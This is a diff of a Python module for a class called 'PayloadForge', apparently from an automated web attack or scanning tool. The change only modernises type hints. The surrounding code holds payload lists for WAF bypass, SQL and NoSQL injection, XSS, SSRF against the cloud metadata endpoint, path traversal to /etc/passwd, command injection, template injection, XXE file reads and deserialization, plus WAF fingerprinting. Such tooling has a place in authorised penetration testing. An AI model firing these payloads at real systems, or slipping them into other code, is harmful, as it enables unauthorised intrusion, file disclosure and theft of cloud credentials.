@@ -3,22 +3,21 @@
 from __future__ import annotations
 
 import base64
-import json
 import random
-from typing import Any, Dict, List, Optional
+from typing import Any
 
 
 class PayloadForge:
     def __init__(self):
         self._waf_signatures = self._load_waf_signatures()
 
-    def get_waf_bypass_payloads(self, base_payloads: List[str], waf: str = "unknown") -> List[str]:
+    def get_waf_bypass_payloads(self, base_payloads: list[str], waf: str = "unknown") -> list[str]:
         bypassed = []
         for payload in base_payloads:
             bypassed.extend(self._apply_waf_bypasses(payload, waf))
         return list(dict.fromkeys(bypassed))[:30]
 
-    def get_encoded_payloads(self, payload: str, encoding: str = "all") -> List[str]:
+    def get_encoded_payloads(self, payload: str, encoding: str = "all") -> list[str]:
         encodings = [encoding] if encoding != "all" else ["url_double", "url_unicode", "base64", "hex", "mixed", "html_entity"]
         result = []
         for enc in encodings:
@@ -28,7 +27,7 @@ class PayloadForge:
                 continue
         return result
 
-    def get_context_payloads(self, attack_type: str, context: Dict[str, Any]) -> List[str]:
+    def get_context_payloads(self, attack_type: str, context: dict[str, Any]) -> list[str]:
         location = context.get("location", "query")
         tech_stack = context.get("fingerprint", {}).get("technologies", [])
         if attack_type == "sqli":
@@ -59,15 +58,15 @@ class PayloadForge:
             return self._get_graphql_context(location, "", [], tech_stack)
         return []
 
-    def get_polyglot_uploads(self, file_type: str = "all") -> List[Dict[str, Any]]:
+    def get_polyglot_uploads(self, file_type: str = "all") -> list[dict[str, Any]]:
         if file_type == "all":
             return self._polyglot_uploads
         return [p for p in self._polyglot_uploads if file_type in p.get("types", [])]
 
-    def get_oob_callbacks(self, count: int = 5) -> List[str]:
+    def get_oob_callbacks(self, count: int = 5) -> list[str]:
         return random.sample(self._oob_domains, min(count, len(self._oob_domains)))
 
-    def detect_waf(self, headers: Dict[str, str], body: str, status: int) -> Optional[str]:
+    def detect_waf(self, headers: dict[str, str], body: str, status: int) -> str | None:
         headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
         body_lower = body.lower() if body else ""
         for waf, signatures in self._waf_signatures.items():
@@ -85,7 +84,7 @@ class PayloadForge:
                             return waf
         return None
 
-    def _apply_waf_bypasses(self, payload: str, waf: str) -> List[str]:
+    def _apply_waf_bypasses(self, payload: str, waf: str) -> list[str]:
         bypasses = [payload]
         bypasses.append(payload.replace(" ", "/**/"))
         bypasses.append(payload.replace(" ", "%09"))
@@ -134,7 +133,7 @@ class PayloadForge:
     def _toggle_case(self, payload: str) -> str:
         return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
 
-    def _get_sqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_sqli_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         # Generic & Auth bypass
         base = [
             "' OR 1=1--", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
@@ -190,7 +189,7 @@ class PayloadForge:
             ])
         return list(dict.fromkeys(base))
 
-    def _get_xss_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_xss_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # HTML tag context
             "<script>alert(1)</script>",
@@ -232,7 +231,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_ssrf_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_ssrf_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # AWS & OpenStack IMDS
             "http://169.254.169.254/latest/meta-data/",
@@ -260,7 +259,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_lfi_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_lfi_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # Linux Standard
             "../../../../etc/passwd", "../../../../../etc/passwd", "../../../../../../etc/passwd",
@@ -289,7 +288,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_rce_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_rce_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # Unix command separators
             "; id", "| id", "&& id", "|| id", "`id`", "$(id)", "\n id \n",
@@ -308,7 +307,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_ssti_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_ssti_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # Arithmetic discriminators (Jinja2, Twig, Freemarker, Smarty, Mako)
             "{{777*777}}", "{{7*'7'}}", "{{7*7}}", "${777*777}", "${7*7}",
@@ -340,7 +339,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_nosqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_nosqli_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # JSON-based operators
             '{"$ne": null}', '{"$ne": ""}', '{"$ne": 0}', '{"$ne": 1}',
@@ -356,7 +355,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_xxe_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_xxe_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
             '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
@@ -367,7 +366,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_crypto_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_crypto_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             "test", "admin", "null", "undefined", "AAAA",
             "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA",  # 32-byte block
@@ -378,7 +377,7 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_deser_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_deser_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         base = [
             # PHP Serialization
             'O:4:"Test":0:{}', 'a:1:{s:4:"test";s:4:"test";}',
@@ -393,10 +392,10 @@ class PayloadForge:
         ]
         return list(dict.fromkeys(base))
 
-    def _get_race_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_race_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         return ["1", "2", "0", "-1", "100", "9999999", "0.01", "-0.01"]
 
-    def _get_smuggling_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_smuggling_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         return [
             "http://127.0.0.1",
             "http://127.0.0.1:80",
@@ -405,7 +404,7 @@ class PayloadForge:
             "http://[::1]",
         ]
 
-    def _get_graphql_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
+    def _get_graphql_context(self, location: str, content_type: str, frameworks: list[str], tech_stack: list[str]) -> list[str]:
         return [
             '{ __schema { types { name fields { name type { name kind } } } } }',
             '{ __schema { queryType { name fields { name } } mutationType { name fields { name } } } }',
@@ -414,7 +413,7 @@ class PayloadForge:
             'query { user(id: 1) { id email role } }',
         ]
 
-    def _load_waf_signatures(self) -> Dict[str, Any]:
+    def _load_waf_signatures(self) -> dict[str, Any]:
         return {
             "cloudflare": {
                 "header": ["cf-ray", "cloudflare", "cf-cache-status"],
